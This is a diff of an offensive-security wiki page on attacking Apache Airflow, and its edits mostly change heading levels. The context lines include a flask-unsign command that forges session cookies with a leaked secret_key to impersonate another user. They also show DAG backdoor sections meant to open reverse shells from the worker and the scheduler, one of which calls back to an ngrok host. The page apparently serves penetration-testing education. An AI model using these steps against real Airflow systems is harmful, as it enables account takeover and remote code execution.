@@ -17,21 +17,19 @@ Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
 </details>
 
 
-# Apache Airflow
-
-## Basic Information
+# Basic Information
 
 [**Apache Airflow**](https://airflow.apache.org)  is used for the **scheduling and **_**orchestration of data pipelines**_** or workflows**. Orchestration of data pipelines refers to the sequencing, coordination, scheduling, and managing complex **data pipelines from diverse sources**. These data pipelines deliver data sets that are ready for consumption either by business intelligence applications and data science, machine learning models that support big data applications.
 
 Basically, Apache Airflow will allow you to **schedule de execution of code when something** (event, cron) **happens**.
 
-## Local Lab
+# Local Lab
 
-### Docker-Compose
+## Docker-Compose
 
 You can use the **docker-compose config file from** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml)  to launch a complete apache airflow docker environment. (If you are in MacOS make sure to give at least 6GB of RAM to the docker VM).
 
-### Minikube
+## Minikube
 
 One easy way to **run apache airflo**w is to run it **with minikube**:
 
@@ -45,7 +43,7 @@ helm install airflow-release airflow-stable/airflow
 helm delete airflow-release
 ```
 
-## Airflow Configuration
+# Airflow Configuration
 
 Airflow might store **sensitive information** in its configuration or you can find weak configurations in place:
 
@@ -53,7 +51,7 @@ Airflow might store **sensitive information** in its configuration or you can fi
 [airflow-configuration.md](airflow-configuration.md)
 {% endcontent-ref %}
 
-## Airflow RBAC
+# Airflow RBAC
 
 Before start attacking Airflow you should understand **how permissions work**:
 
@@ -61,9 +59,9 @@ Before start attacking Airflow you should understand **how permissions work**:
 [airflow-rbac.md](airflow-rbac.md)
 {% endcontent-ref %}
 
-## Attacks
+# Attacks
 
-### Web Console Enumeration
+## Web Console Enumeration
 
 If you have **access to the web console** you might be able to access some or all of the following information:
 
@@ -73,7 +71,7 @@ If you have **access to the web console** you might be able to access some or al
 * List **users & roles**
 * **Code of each DAG** (which might contain interesting info)
 
-### Privilege Escalation
+## Privilege Escalation
 
 If the **`expose_config`** configuration is set to **True**, from the **role User** and **upwards** can **read** the **config in the web**. In this config, the **`secret_key`** appears, which means any user with this valid they can **create its own signed cookie to impersonate any other user account**.
 
@@ -81,7 +79,7 @@ If the **`expose_config`** configuration is set to **True**, from the **role Use
 flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
 ```
 
-### DAG Backdoor (RCE in Airflow worker)
+## DAG Backdoor (RCE in Airflow worker)
 
 If you have **write access** to the place where the **DAGs are saved**, you can just **create one** that will send you a **reverse shell.**\
 Note that this reverse shell is going to be executed inside an **airflow worker container**:
@@ -125,7 +123,7 @@ with DAG(
     )
 ```
 
-### DAG Backdoor (RCE in Airflow scheduler)
+## DAG Backdoor (RCE in Airflow scheduler)
 
 If you set something to be **executed in the root of the code**, at the moment of this writing, it will be **executed by the scheduler** after a couple of seconds after placing it inside the DAG's folder.
 
@@ -153,7 +151,7 @@ with DAG(
         op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
 ```
 
-### DAG Creation
+## DAG Creation
 
 If you manage to **compromise a machine inside the DAG cluster**, you can create new **DAGs scripts** in the `dags/` folder and they will be **replicated in the rest of the machines** inside the DAG cluster.
 
